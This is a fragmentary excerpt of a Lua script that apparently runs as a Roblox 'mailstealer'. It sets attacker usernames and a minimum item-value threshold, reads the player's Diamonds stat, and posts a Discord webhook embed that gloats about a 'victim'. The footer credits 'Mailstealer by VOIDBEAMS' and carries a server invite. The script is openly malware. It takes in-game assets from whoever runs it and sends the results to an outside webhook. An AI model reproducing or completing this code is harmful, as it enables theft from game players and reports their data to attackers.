...
-- Constants
local USERNAME = "exampleUser1"
local USERNAME2 = "exampleUser2"
local WEBHOOK = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
local MIN_RAP = 1500000
...
Victim tried to use anti-mailstealer, but got fucked instead"
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by VOIDBEAMS. .gg/GY2RVSEGDT"
			}
        }}
    }
...
local gemsleaderstatpath = plr.leaderstats["???????????? Diamonds"]
